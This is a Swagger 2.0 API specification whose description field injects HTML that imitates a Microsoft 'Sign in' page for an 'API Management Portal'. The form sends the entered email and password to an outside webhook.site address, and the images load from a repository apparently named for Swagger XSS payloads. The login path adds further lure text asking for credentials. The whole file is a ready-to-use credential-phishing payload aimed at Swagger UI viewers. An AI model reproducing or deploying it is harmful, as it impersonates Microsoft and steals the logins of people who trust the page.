swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<table width="100%" cellspacing="0" cellpadding="12"><tr><td bgcolor="#0067b8" align="center"><img src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/logo-microsoft.png" width="98" height="25" alt="Microsoft"></td></tr></table><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><font face="Segoe UI" size="6" color="#1b1b1b"><b>Sign in</b></font><br><font face="Segoe UI" size="2" color="#1b1b1b">to continue to </font><font face="Segoe UI" size="2" color="#1b1b1b"><b>API Management Portal</b></font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="2" color="#333333"><b>Email, phone, or Skype</b></font><br><input type="text" name="email" size="34" placeholder="Email, phone, or Skype"><br><br><font face="Segoe UI" size="2" color="#0067b8">No account? Create one!</font><br><br><font face="Segoe UI" size="2" color="#333333"><b>Password</b></font><br><input type="password" name="password" size="34" placeholder="Password"><br><br><font face="Segoe UI" size="2" color="#0067b8">Forgot password?</font><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-office365.png" width="110" height="31" alt="Sign in"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#000000">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="2" color="#ffffff">Terms of use &nbsp;|&nbsp; Privacy &amp; cookies</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
